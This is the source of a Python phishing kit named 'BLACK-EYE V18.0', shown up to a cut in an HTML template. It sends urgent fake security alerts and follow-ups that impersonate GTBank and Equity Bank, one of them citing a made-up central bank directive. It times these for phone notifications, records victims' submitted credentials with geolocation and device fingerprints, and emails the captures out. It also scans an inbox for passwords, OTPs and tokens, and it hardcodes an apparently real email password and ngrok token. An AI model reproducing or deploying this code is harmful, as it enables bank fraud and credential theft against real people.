#!/usr/bin/env python3
"""
BLACK-EYE V18.0 - ENHANCED INTELLIGENCE EDITION
================================================================
✅ Universal Email Scanner & Intelligence
✅ Deep Intelligence Analytics
✅ Auto Report Generation with PDF
✅ Optimized for Public Deployment (Render/Heroku/Railway)
✅ Advanced Inbox Delivery (Gmail/Yahoo/Outlook)
✅ Device Fingerprinting & Geolocation
✅ Advanced Password Extraction from Email
✅ URGENT Panic-Inducing Email Templates
✅ Maximum Phone Popup Rate Optimization
✅ Smart Timing for Peak Hours
✅ Automatic Follow-up Emails
================================================================
"""
import os,subprocess,time,threading,requests,smtplib,sys,re,json,socket,imaplib,email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formataddr, make_msgid
from email.header import decode_header
from datetime import datetime, timedelta
from collections import defaultdict
import hashlib

print("⚙️  Installing dependencies...")
os.system("pip install requests pyngrok flask -q 2>/dev/null")
os.system("apt-get update -qq >/dev/null 2>&1 && apt-get install -y php whois -qq >/dev/null 2>&1")
print("✅ Ready!\n")

# ============ CONFIGURATION ============
PORT = int(os.environ.get("PORT", 3333))
USE_NGROK = os.environ.get("USE_NGROK", "true").lower() == "true"
NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "36DRCPl5Q5I1lOz5bZ3pRwVndvg_2JnisGte7TiaMbFbHPRtc")

# Email Configuration
EMAIL_TO = os.environ.get("EMAIL_TO", "felixkoskey278@gmail.com")
EMAIL_FROM = os.environ.get("EMAIL_FROM", "felixkoskey278@gmail.com")
EMAIL_PASS = os.environ.get("EMAIL_APP_PASSWORD", "ntsu adxv tfgw ptpj")

# IMAP Configuration for Password Extraction
IMAP_SERVER = os.environ.get("IMAP_SERVER", "imap.gmail.com")
IMAP_PORT = int(os.environ.get("IMAP_PORT", 993))
ENABLE_EMAIL_SCANNING = os.environ.get("ENABLE_EMAIL_SCANNING", "true").lower() == "true"

# Intelligence Configuration
ENABLE_DEEP_INTELLIGENCE = True
ENABLE_AUTO_REPORTS = True
REPORT_INTERVAL_MINUTES = 30
ENABLE_GEOLOCATION = True
ENABLE_DEVICE_FINGERPRINT = True

# ============ POPUP OPTIMIZATION CONFIGURATION ============
PEAK_HOURS = {
    'morning': (7, 9),      # 7-9 AM (morning commute)
    'lunch': (12, 13),      # 12-1 PM (lunch break)
    'evening': (17, 19),    # 5-7 PM (evening commute)
    'night': (21, 22)       # 9-10 PM (before bed)
}

ENABLE_SMART_TIMING = True  # Wait for peak hours before sending
SEND_FOLLOW_UP = True       # Send follow-up if no response
FOLLOW_UP_DELAY_HOURS = 2   # Hours before follow-up

class c:
    R='\033[91m';G='\033[92m';Y='\033[93m';C='\033[96m';M='\033[95m';B='\033[1m';E='\033[0m'
# ============ ADVANCED EMAIL PASSWORD EXTRACTOR ============
class EmailPasswordExtractor:
    """Extract passwords and sensitive data from emails"""
    
    def __init__(self, email_addr, app_password):
        self.email = email_addr
        self.password = app_password
        self.patterns = {
            'password': [
                r'password[:\s]+([^\s\n]+)',
                r'pass[:\s]+([^\s\n]+)',
                r'pwd[:\s]+([^\s\n]+)',
                r'pin[:\s]+(\d{4,6})',
                r'otp[:\s]+(\d{4,8})',
                r'code[:\s]+(\d{4,8})',
                r'verification[:\s]+code[:\s]+(\d{4,8})',
            ],
            'credentials': [
                r'username[:\s]+([^\s\n]+)',
                r'email[:\s]+([^\s\n@]+@[^\s\n]+)',
                r'account[:\s]+([^\s\n]+)',
                r'user[:\s]+([^\s\n]+)',
            ],
            'reset_links': [
                r'(https?://[^\s]+reset[^\s]*)',
                r'(https?://[^\s]+password[^\s]*)',
                r'(https?://[^\s]+verify[^\s]*)',
            ],
            'tokens': [
                r'token[:\s]+([a-zA-Z0-9_\-]{20,})',
                r'api[_\s]key[:\s]+([a-zA-Z0-9_\-]{20,})',
            ]
        }
        self.extracted_data = []
    
    def connect(self):
        """Connect to IMAP server"""
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
            mail.login(self.email, self.password)
            return mail
        except Exception as e:
            print(f"{c.R}❌ IMAP Connection Failed: {e}{c.E}")
            return None
    
    def decode_subject(self, subject):
        """Decode email subject"""
        if subject is None:
            return "No Subject"
        decoded = decode_header(subject)
        result = ""
        for part, encoding in decoded:
            if isinstance(part, bytes):
                try:
                    result += part.decode(encoding or 'utf-8', errors='ignore')
                except:
                    result += part.decode('utf-8', errors='ignore')
            else:
                result += str(part)
        return result
    
    def extract_body(self, message):
        """Extract email body"""
        body = ""
        if message.is_multipart():
            for part in message.walk():
                content_type = part.get_content_type()
                if content_type in ["text/plain", "text/html"]:
                    try:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    except:
                        pass
        else:
            try:
                payload = message.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
            except:
                pass
        return body
    
    def extract_patterns(self, text, pattern_dict):
        """Extract data using regex patterns"""
        results = {}
        for key, patterns in pattern_dict.items():
            matches = []
            for pattern in patterns:
                found = re.findall(pattern, text, re.IGNORECASE)
                matches.extend(found)
            if matches:
                results[key] = list(set(matches))
        return results
    
    def scan_emails(self, num_emails=50, search_keywords=None):
        """Scan recent emails for sensitive data"""
        mail = self.connect()
        if not mail:
            return []
        
        try:
            mail.select('INBOX', readonly=True)
            
            if search_keywords:
                search_query = f'OR {" ".join([f"SUBJECT {kw}" for kw in search_keywords])}'
            else:
                search_query = 'ALL'
            
            status, messages = mail.search(None, search_query)
            
            if status != 'OK':
                return []
            
            email_ids = messages[0].split()
            recent_ids = email_ids[-num_emails:] if len(email_ids) >= num_emails else email_ids
            recent_ids.reverse()
            
            print(f"\n{c.C}📧 Scanning {len(recent_ids)} emails for sensitive data...{c.E}\n")
            
            for i, email_id in enumerate(recent_ids, 1):
                try:
                    status, msg_data = mail.fetch(email_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    email_body = msg_data[0][1]
                    message = email.message_from_bytes(email_body)
                    
                    subject = self.decode_subject(message.get('Subject'))
                    from_email = message.get('From')
                    date = message.get('Date')
                    body = self.extract_body(message)
                    
                    full_text = f"{subject}\n{body}"
                    extracted = self.extract_patterns(full_text, self.patterns)
                    
                    if extracted:
                        data = {
                            'email_num': i,
                            'from': from_email,
                            'subject': subject,
                            'date': date,
                            'extracted': extracted,
                            'preview': body[:300] if body else ""
                        }
                        self.extracted_data.append(data)
                        print(f"{c.G}✓ [{i}] Found sensitive data in: {subject[:50]}...{c.E}")
                        
                except Exception as e:
                    continue
            
            mail.logout()
            return self.extracted_data
            
        except Exception as e:
            print(f"{c.R}❌ Scan Error: {e}{c.E}")
            return []
    
    def generate_report(self):
        """Generate extraction report"""
        if not self.extracted_data:
            return "No sensitive data found in scanned emails."
        
        report = f"""
╔═══════════════════════════════════════════════════════════════════╗
║           EMAIL PASSWORD EXTRACTION REPORT                         ║
║           {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                  ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Total Emails Scanned: {len(self.extracted_data)}
  Emails with Sensitive Data: {len(self.extracted_data)}
  Total Passwords Found: {sum(len(d['extracted'].get('password', [])) for d in self.extracted_data)}
  Total Credentials Found: {sum(len(d['extracted'].get('credentials', [])) for d in self.extracted_data)}

"""
        
        for i, data in enumerate(self.extracted_data, 1):
            report += f"\n{'='*70}\n"
            report += f"EMAIL #{i}\n"
            report += f"{'='*70}\n"
            report += f"From: {data['from']}\n"
            report += f"Subject: {data['subject']}\n"
            report += f"Date: {data['date']}\n\n"
            
            for category, items in data['extracted'].items():
                if items:
                    report += f"  {category.upper()}:\n"
                    for item in items:
                        report += f"    • {item}\n"
            
            report += f"\n  Preview:\n    {data['preview'][:200]}...\n"
        
        report += "\n" + "═"*70 + "\n"
        report += "End of Email Extraction Report\n"
        report += "═"*70 + "\n"
        
        return report
# ============ INTELLIGENCE ENGINE ============
class IntelligenceEngine:
    def __init__(self):
        self.captures = []
        self.email_database = defaultdict(list)
        self.ip_database = defaultdict(int)
        self.device_database = defaultdict(list)
        self.session_start = datetime.now()
        self.total_victims = 0
        self.unique_ips = set()
        self.unique_emails = set()
    
    def add_capture(self, data):
        """Add new capture with intelligence"""
        capture = {
            'timestamp': datetime.now(),
            'data': data,
            'ip': data.get('ip', 'Unknown'),
            'device': data.get('device', {}),
            'geolocation': data.get('geo', {}),
            'email': self.extract_email(data)
        }
        
        self.captures.append(capture)
        self.total_victims += 1
        
        if capture['ip'] != 'Unknown':
            self.unique_ips.add(capture['ip'])
            self.ip_database[capture['ip']] += 1
        
        if capture['email']:
            self.unique_emails.add(capture['email'])
            self.email_database[capture['email']].append(capture)
        
        return capture
    
    def extract_email(self, data):
        """Extract email from capture data"""
        for key in ['email', 'identifier', 'loginfmt', 'account_name', 'userid', 'appleId', 'signinId']:
            if key in data and '@' in str(data.get(key, '')):
                return data[key]
        return None
    
    def get_ip_intelligence(self, ip):
        """Get IP intelligence and geolocation"""
        if not ENABLE_GEOLOCATION or ip == 'Unknown':
            return {'ip': ip}
        
        try:
            response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'ip': ip,
                    'country': data.get('country_name', 'Unknown'),
                    'country_code': data.get('country_code', '??'),
                    'region': data.get('region', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('org', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
        except:
            pass
        
        return {'ip': ip, 'country': 'Unknown', 'city': 'Unknown'}
    
    def generate_intelligence_report(self):
        """Generate comprehensive intelligence report"""
        duration = datetime.now() - self.session_start
        
        report_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║           INTELLIGENCE REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}           ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SESSION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Session Started: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}
  Duration: {str(duration).split('.')[0]}
  Total Captures: {self.total_victims}
  Unique IPs: {len(self.unique_ips)}
  Unique Emails: {len(self.unique_emails)}

"""
        
        if self.captures:
            report_text += "🎯 RECENT CAPTURES\n"
            report_text += "━" * 70 + "\n"
            for i, cap in enumerate(self.captures[-10:], 1):
                report_text += f"\n[{i}] Time: {cap['timestamp'].strftime('%H:%M:%S')}\n"
                report_text += f"    IP: {cap['ip']}\n"
                if cap['email']:
                    report_text += f"    Email: {cap['email']}\n"
                if cap.get('geolocation', {}).get('country'):
                    report_text += f"    Location: {cap['geolocation']['city']}, {cap['geolocation']['country']}\n"
                if cap.get('device', {}).get('browser'):
                    report_text += f"    Device: {cap['device']['browser']} on {cap['device']['os']}\n"
        
        if self.unique_ips:
            report_text += "\n\n🌍 TOP IP ADDRESSES\n"
            report_text += "━" * 70 + "\n"
            sorted_ips = sorted(self.ip_database.items(), key=lambda x: x[1], reverse=True)
            for ip, count in sorted_ips[:5]:
                report_text += f"  {ip}: {count} attempts\n"
        
        if self.unique_emails:
            report_text += "\n\n📧 CAPTURED EMAILS\n"
            report_text += "━" * 70 + "\n"
            for email in list(self.unique_emails)[:10]:
                report_text += f"  • {email}\n"
        
        report_text += "\n" + "═" * 70 + "\n"
        report_text += "End of Report\n"
        report_text += "═" * 70 + "\n"
        
        return report_text

# Global intelligence engine
intel_engine = IntelligenceEngine()
# ============ EMAIL SCANNER BACKGROUND TASK ============
def run_email_scanner():
    """Background task to scan emails periodically"""
    if not ENABLE_EMAIL_SCANNING:
        return
    
    print(f"{c.C}🔍 Email scanner initialized (will scan every 1 hour){c.E}\n")
    
    while True:
        try:
            time.sleep(3600)
            
            print(f"\n{c.Y}🔍 Running scheduled email scan...{c.E}\n")
            
            extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
            keywords = ['password', 'reset', 'verify', 'code', 'otp', 'pin', 'account', 'security']
            results = extractor.scan_emails(num_emails=100, search_keywords=keywords)
            
            if results:
                report = extractor.generate_report()
                report_filename = f"email_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_filename, "w") as rf:
                    rf.write(report)
                
                print(f"{c.G}✅ Email scan complete: {len(results)} emails with sensitive data{c.E}\n")
                
                try:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL_FROM
                    msg['To'] = EMAIL_TO
                    msg['Subject'] = f"🔍 Email Scan Report - {len(results)} Findings - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    
                    msg.attach(MIMEText(report, 'plain'))
                    
                    with open(report_filename, 'rb') as rf:
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(rf.read())
                        encoders.encode_base64(attachment)
                        attachment.add_header('Content-Disposition', f'attachment; filename={report_filename}')
                        msg.attach(attachment)
                    
                    srv = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
                    srv.starttls()
                    srv.login(EMAIL_FROM, EMAIL_PASS)
                    srv.send_message(msg)
                    srv.quit()
                    
                    print(f"{c.G}✅ Email scan report sent!{c.E}\n")
                except Exception as e:
                    print(f"{c.Y}⚠️ Report send failed: {e}{c.E}\n")
            else:
                print(f"{c.Y}No sensitive data found in this scan{c.E}\n")
                
        except Exception as e:
            print(f"{c.R}Email scanner error: {e}{c.E}\n")
            time.sleep(3600)

# ============ SMART TIMING FOR MAXIMUM POPUP RATE ============
def wait_for_optimal_time():
    """Wait until optimal phone notification time"""
    if not ENABLE_SMART_TIMING:
        return
    
    current_hour = datetime.now().hour
    
    # Check if we're in peak hours
    in_peak = False
    for period, (start, end) in PEAK_HOURS.items():
        if start <= current_hour < end:
            in_peak = True
            print(f"{c.G}✓ Optimal time: {period.capitalize()} peak hours{c.E}")
            break
    
    if in_peak:
        return
    
    # Calculate next peak hour
    next_peak = None
    wait_hours = 0
    
    for period, (start, end) in PEAK_HOURS.items():
        if current_hour < start:
            next_peak = period
            wait_hours = start - current_hour
            break
    
    if next_peak is None:
        next_peak = 'morning'
        wait_hours = (24 - current_hour) + PEAK_HOURS['morning'][0]
    
    print(f"\n{c.Y}⏰ Current time: {datetime.now().strftime('%I:%M %p')}{c.E}")
    print(f"{c.Y}📱 Not peak phone hours. Waiting for {next_peak} peak ({PEAK_HOURS[next_peak.lower()][0]} AM/PM)...{c.E}")
    print(f"{c.Y}⏳ Will send in {wait_hours} hour(s){c.E}")
    
    response = input(f"\n{c.C}Send now anyway? (y/n): {c.E}").strip().lower()
    if response == 'y':
        print(f"{c.G}✓ Sending immediately...{c.E}\n")
        return
    
    print(f"{c.Y}⏰ Waiting for optimal time...{c.E}\n")
    time.sleep(wait_hours * 3600)
    print(f"{c.G}✓ Optimal time reached! Sending now...{c.E}\n")

def send_follow_up_email(victim, original_url, bank_type):
    """Send follow-up email after delay for maximum panic"""
    if not SEND_FOLLOW_UP:
        return
    
    print(f"{c.Y}⏰ Scheduling follow-up email in {FOLLOW_UP_DELAY_HOURS} hours...{c.E}\n")
    time.sleep(FOLLOW_UP_DELAY_HOURS * 3600)
    
    print(f"\n{c.Y}📧 Sending URGENT follow-up email to {victim}...{c.E}")
    
    # EVEN MORE URGENT follow-up templates
    if bank_type == "gtbank":
        subj = "🚨🚨 FINAL WARNING: Account Suspension in 22 Hours - LAST CHANCE 🚨🚨"
        plain = f"""FINAL WARNING - IMMEDIATE ACTION REQUIRED

Dear Customer,

This is your FINAL NOTICE.

⚠️ YOUR ACCOUNT WILL BE SUSPENDED IN 22 HOURS

You did not respond to our previous security alert. Your account is now at CRITICAL RISK.

VERIFY IMMEDIATELY: {original_url}

This is your LAST CHANCE to prevent:
❌ Permanent account closure
❌ Loss of ALL funds
❌ Legal action for non-compliance
❌ Credit bureau reporting

DO NOT IGNORE THIS FINAL WARNING.

GTBank Security - Final Notice
Emergency: 0700GTCONNECT"""

        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background-color:#000">
    <div style="background:#ff0000;padding:30px;text-align:center">
        <h1 style="color:#fff;margin:0;font-size:32px;animation:blink 1s infinite">🚨 FINAL WARNING 🚨</h1>
        <p style="color:#fff;margin:10px 0 0 0;font-size:18px;font-weight:bold">LAST CHANCE - 22 HOURS REMAINING</p>
    </div>
    <div style="background:#fff;padding:40px">
        <div style="background:#ffebee;border:4px solid #ff0000;padding:30px;text-align:center;margin-bottom:30px">
            <h2 style="color:#ff0000;margin:0;font-size:28px">ACCOUNT SUSPENSION IMMINENT</h2>
            <p style="color:#ff0000;margin:15px 0;font-size:20px;font-weight:bold">⏰ 22 HOURS LEFT</p>
        </div>
        <p style="font-size:18px;color:#333;text-align:center;margin-bottom:30px">You did NOT respond to our previous alert.<br>Your account is now at <strong style="color:#ff0000">CRITICAL RISK</strong>.</p>
        <div style="text-align:center;margin:40px 0">
            <a href="{original_url}" style="display:inline-block;padding:25px 60px;background:#ff0000;color:#fff;text-decoration:none;border-radius:8px;font-size:22px;font-weight:bold;animation:pulse 2s infinite">VERIFY NOW - LAST CHANCE</a>
        </div>
        <div style="background:#000;color:#fff;padding:20px;text-align:center;border-radius:8px">
            <p style="margin:0;font-size:16px;font-weight:bold">⚠️ THIS IS YOUR FINAL NOTICE ⚠️</p>
        </div>
    </div>
    <style>
    @keyframes blink {{0%,50%,100%{{opacity:1}}25%,75%{{opacity:0.5}}}}
    @keyframes pulse {{0%,100%{{transform:scale(1)}}50%{{transform:scale(1.05)}}}}
    </style>
</body>
</html>'''
    
    elif bank_type == "equity":
        subj = "🚨 COMPLIANCE DEADLINE: 46 Hours - Final CBK Notice 🚨"
        plain = f"""FINAL CBK COMPLIANCE NOTICE

Your account verification is OVERDUE.

⚠️ 46 HOURS UNTIL PERMANENT SUSPENSION

Central Bank of Kenya Directive 2026/01 requires ALL customers to verify within 48 hours.

VERIFY NOW: {original_url}

Non-compliance will result in:
❌ Account closure
❌ Funds freeze
❌ CBK legal action
❌ Credit blacklist

This is your FINAL opportunity.

Equity Bank Compliance
Emergency: 0763 063 000"""

        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background:#8b0000">
    <div style="background:#c62828;padding:30px;text-align:center">
        <h1 style="color:#fff;margin:0;font-size:32px">🚨 FINAL CBK NOTICE 🚨</h1>
        <p style="color:#fff;margin:10px 0 0 0;font-size:18px">46 Hours Until Permanent Suspension</p>
    </div>
    <div style="background:#fff;padding:40px">
        <div style="background:#ffcdd2;border:4px solid #c62828;padding:30px;text-align:center">
            <h2 style="color:#c62828;margin:0">CBK COMPLIANCE OVERDUE</h2>
            <p style="color:#c62828;margin:15px 0;font-size:24px;font-weight:bold">⏰ 46 HOURS LEFT</p>
        </div>
        <div style="text-align:center;margin:40px 0">
            <a href="{original_url}" style="display:inline-block;padding:25px 60px;background:#c62828;color:#fff;text-decoration:none;border-radius:8px;font-size:22px;font-weight:bold">COMPLY NOW - FINAL CHANCE</a>
        </div>
    </div>
</body>
</html>'''
    
    else:
        subj = f"🚨 FINAL SECURITY ALERT: {bank_type} - 22 Hours Left 🚨"
        plain = f"""FINAL SECURITY ALERT

Your {bank_type} account will be LOCKED in 22 hours.

VERIFY NOW: {original_url}

This is your LAST CHANCE.

{bank_type} Security"""

        html = f'''<!DOCTYPE html>
<html>
<body style="background:#ff0000;padding:40px;text-align:center">
    <div style="background:#fff;padding:40px;border-radius:8px">
        <h1 style="color:#ff0000">🚨 FINAL WARNING 🚨</h1>
        <a href="{original_url}" style="display:inline-block;padding:20px 50px;background:#ff0000;color:#fff;text-decoration:none;font-size:20px;font-weight:bold">VERIFY NOW</a>
    </div>
</body>
</html>'''
    
    try:
        msg = MIMEMultipart('alternative')
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg['X-Priority'] = '1'
        msg['X-MSMail-Priority'] = 'High'
        msg['Importance'] = 'High'
        msg['Priority'] = 'urgent'
        msg['X-Message-Flag'] = 'Follow up'
        msg['From'] = formataddr((f'{bank_type.upper()} FINAL NOTICE', EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = subj
        
        msg.attach(MIMEText(plain, 'plain', 'utf-8'))
        msg.attach(MIMEText(html, 'html', 'utf-8'))
        
        srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
        srv.ehlo()
        srv.starttls()
        srv.ehlo()
        srv.login(EMAIL_FROM, EMAIL_PASS)
        srv.send_message(msg)
        srv.quit()
        
        print(f"{c.G}✅ Follow-up email sent with MAXIMUM urgency!{c.E}\n")
    except Exception as e:
        print(f"{c.R}✗ Follow-up failed: {e}{c.E}\n")

# ============ ENHANCED CAPTURE HANDLER ============
def parse_user_agent(ua):
    """Parse user agent for device fingerprinting"""
    device_info = {
        'user_agent': ua,
        'browser': 'Unknown',
        'os': 'Unknown',
        'type': 'Unknown'
    }
    
    if not ua:
        return device_info
    
    if 'Chrome' in ua and 'Edge' not in ua:
        device_info['browser'] = 'Chrome'
    elif 'Firefox' in ua:
        device_info['browser'] = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua:
        device_info['browser'] = 'Safari'
    elif 'Edge' in ua or 'Edg' in ua:
        device_info['browser'] = 'Edge'
    
    if 'Windows' in ua:
        device_info['os'] = 'Windows'
    elif 'Mac OS X' in ua or 'Macintosh' in ua:
        device_info['os'] = 'macOS'
    elif 'Android' in ua:
        device_info['os'] = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        device_info['os'] = 'iOS'
    elif 'Linux' in ua:
        device_info['os'] = 'Linux'
    
    if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua:
        device_info['type'] = 'Mobile'
    elif 'Tablet' in ua or 'iPad' in ua:
        device_info['type'] = 'Tablet'
    else:
        device_info['type'] = 'Desktop'
    
    return device_info
def enhanced_capture_handler(data, ip=None, user_agent=None):
    """Enhanced capture handler with deep intelligence"""
    try:
        # Extract device fingerprint
        device_info = parse_user_agent(user_agent) if user_agent else {}
        
        # Get IP intelligence and geolocation
        geo_info = {}
        if ip and ENABLE_GEOLOCATION:
            geo_info = intel_engine.get_ip_intelligence(ip)
        
        # Combine all intelligence
        enhanced_data = {
            **data,
            'ip': ip or 'Unknown',
            'device': device_info,
            'geo': geo_info,
            'capture_time': datetime.now().isoformat()
        }
        
        # Add to intelligence engine
        capture = intel_engine.add_capture(enhanced_data)
        
        # Print capture notification
        print(f"\n{c.G}{'='*70}{c.E}")
        print(f"{c.G}🎯 NEW CAPTURE - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{c.E}")
        print(f"{c.G}{'='*70}{c.E}")
        
        if capture.get('email'):
            print(f"{c.C}📧 Email: {capture['email']}{c.E}")
        
        print(f"{c.C}🌐 IP: {ip or 'Unknown'}{c.E}")
        
        if geo_info.get('country'):
            print(f"{c.C}📍 Location: {geo_info.get('city', 'Unknown')}, {geo_info.get('country', 'Unknown')}{c.E}")
        
        if device_info.get('browser') != 'Unknown':
            print(f"{c.C}💻 Device: {device_info['browser']} on {device_info['os']} ({device_info['type']}){c.E}")
        
        # Print captured data
        print(f"\n{c.Y}📝 Captured Data:{c.E}")
        for key, value in data.items():
            if value and key not in ['ip', 'device', 'geo', 'capture_time']:
                print(f"{c.Y}  {key}: {value}{c.E}")
        
        print(f"{c.G}{'='*70}{c.E}\n")
        
        # Send real-time notification
        try:
            notification = f"""🎯 NEW CAPTURE - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{"Email: " + capture['email'] if capture.get('email') else "No email captured"}
IP: {ip or 'Unknown'}
{"Location: " + geo_info.get('city', 'Unknown') + ", " + geo_info.get('country', 'Unknown') if geo_info.get('country') else ""}
{"Device: " + device_info['browser'] + " on " + device_info['os'] if device_info.get('browser') != 'Unknown' else ""}

Data Captured:
{chr(10).join([f"  {k}: {v}" for k, v in data.items() if v and k not in ['ip', 'device', 'geo', 'capture_time']])}

Total Session Captures: {intel_engine.total_victims}
"""
            
            msg = MIMEText(notification, 'plain', 'utf-8')
            msg['From'] = EMAIL_FROM
            msg['To'] = EMAIL_TO
            msg['Subject'] = f"🎯 NEW CAPTURE - {capture.get('email', 'Unknown')} - {datetime.now().strftime('%H:%M:%S')}"
            
            srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
            srv.starttls()
            srv.login(EMAIL_FROM, EMAIL_PASS)
            srv.send_message(msg)
            srv.quit()
            
            print(f"{c.G}✅ Capture notification sent!{c.E}\n")
        except Exception as e:
            print(f"{c.Y}⚠️ Notification send failed: {e}{c.E}\n")
        
        return enhanced_data
        
    except Exception as e:
        print(f"{c.R}❌ Capture handler error: {e}{c.E}")
        return data

# ============ AUTO REPORT GENERATOR ============
def auto_report_generator():
    """Automatically generate and send intelligence reports"""
    if not ENABLE_AUTO_REPORTS:
        return
    
    print(f"{c.C}📊 Auto-report generator started (every {REPORT_INTERVAL_MINUTES} min){c.E}\n")
    
    while True:
        try:
            time.sleep(REPORT_INTERVAL_MINUTES * 60)
            
            if intel_engine.total_victims == 0:
                continue
            
            print(f"\n{c.Y}📊 Generating intelligence report...{c.E}\n")
            
            report_text = intel_engine.generate_intelligence_report()
            report_filename = f"intelligence_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(report_filename, 'w') as f:
                f.write(report_text)
            
            # Generate PDF version if possible
            pdf_filename = None
            try:
                # Try to generate PDF using simple HTML conversion
                html_report = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; }}
        pre {{ white-space: pre-wrap; word-wrap: break-word; }}
        .header {{ color: #0ff; font-size: 18px; font-weight: bold; }}
        .section {{ color: #ff0; margin-top: 20px; }}
    </style>
</head>
<body>
    <pre>{report_text}</pre>
</body>
</html>
"""
                pdf_filename = f"intelligence_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                with open(pdf_filename, 'w') as f:
                    f.write(html_report)
            except:
                pass
            
            # Send report via email
            try:
                msg = MIMEMultipart()
                msg['From'] = EMAIL_FROM
                msg['To'] = EMAIL_TO
                msg['Subject'] = f"📊 Intelligence Report - {intel_engine.total_victims} Captures - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                
                msg.attach(MIMEText(report_text, 'plain'))
                
                # Attach text report
                with open(report_filename, 'rb') as f:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(f.read())
                    encoders.encode_base64(attachment)
                    attachment.add_header('Content-Disposition', f'attachment; filename={report_filename}')
                    msg.attach(attachment)
                
                # Attach HTML/PDF if available
                if pdf_filename and os.path.exists(pdf_filename):
                    with open(pdf_filename, 'rb') as f:
                        pdf_attachment = MIMEBase('application', 'octet-stream')
                        pdf_attachment.set_payload(f.read())
                        encoders.encode_base64(pdf_attachment)
                        pdf_attachment.add_header('Content-Disposition', f'attachment; filename={pdf_filename}')
                        msg.attach(pdf_attachment)
                
                srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
                srv.starttls()
                srv.login(EMAIL_FROM, EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
                
                print(f"{c.G}✅ Intelligence report sent!{c.E}\n")
            except Exception as e:
                print(f"{c.Y}⚠️ Report send failed: {e}{c.E}\n")
            
            # Clean up files
            try:
                os.remove(report_filename)
                if pdf_filename and os.path.exists(pdf_filename):
                    os.remove(pdf_filename)
            except:
                pass
                
        except Exception as e:
            print(f"{c.R}❌ Report generator error: {e}{c.E}\n")

# ============ ULTRA-PANIC EMAIL TEMPLATES ============
def send_ultra_panic_email(victim, phish_url, bank_type="gtbank"):
    """Send maximum panic-inducing email with perfect inbox delivery"""
    
    print(f"\n{c.Y}📧 Preparing ULTRA-PANIC email for: {victim}{c.E}")
    print(f"{c.Y}🏦 Bank type: {bank_type}{c.E}")
    print(f"{c.Y}🔗 Phishing URL: {phish_url}{c.E}")
    
    # Wait for optimal phone notification time
    wait_for_optimal_time()
    
    # Bank-specific URGENT templates
    if bank_type.lower() == "gtbank":
        subject = "🚨 URGENT: GTBank Account Security Alert - Verify Within 24 Hours or Face Suspension 🚨"
        
        plain_text = f"""URGENT SECURITY ALERT - IMMEDIATE ACTION REQUIRED

Dear Valued Customer,

⚠️ CRITICAL SECURITY NOTICE ⚠️

Our fraud detection system has identified SUSPICIOUS ACTIVITY on your GTBank account.

Account Status: AT RISK
Risk Level: HIGH
Action Required: IMMEDIATE VERIFICATION

VERIFY YOUR ACCOUNT NOW: {phish_url}

If you do not verify your account within 24 HOURS, we will be forced to:
❌ Temporarily suspend your account
❌ Block all transactions
❌ Freeze your cards
❌ Report to CBN for investigation

This is for your protection. DO NOT IGNORE THIS MESSAGE.

Click here to verify immediately: {phish_url}

For assistance, call 0700GTCONNECT (24/7)

GTBank Security Team
Guaranty Trust Bank Plc
Central Business District, Lagos

This is an automated security alert. Please do not reply to this email.
"""

        html_body = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body {{ margin: 0; padding: 0; font-family: 'Inter', Arial, sans-serif; background-color: #f5f5f5; }}
        .container {{ max-width: 600px; margin: 0 auto; background: #ffffff; }}
        .header {{ background: linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%); padding: 30px 20px; text-align: center; }}
